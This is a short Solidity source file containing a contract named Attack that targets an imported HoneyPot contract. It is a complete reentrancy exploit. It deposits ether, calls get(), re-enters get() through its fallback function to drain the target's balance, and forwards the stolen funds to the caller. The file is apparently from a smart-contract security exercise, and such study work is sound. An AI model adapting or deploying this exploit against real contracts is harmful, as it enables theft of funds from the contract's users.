pragma solidity 0.4.24;

import "./HoneyPot.sol";

contract Attack{

    bool done;

    function initAttack(address _honeypot) public payable{

        require(address(_honeypot).balance%msg.value == 0, "will not drain the contract");

        HoneyPot(_honeypot).put.value(msg.value)();
        HoneyPot(_honeypot).get();

        require(address(this).balance > 0);
        
        if(!done){
            
            done = true;
            msg.sender.transfer(address(this).balance);
        }
    }

    function () public payable{
        
        if(msg.sender.balance > 0 && gasleft() >= 3000000)
            HoneyPot(msg.sender).get();
    }
}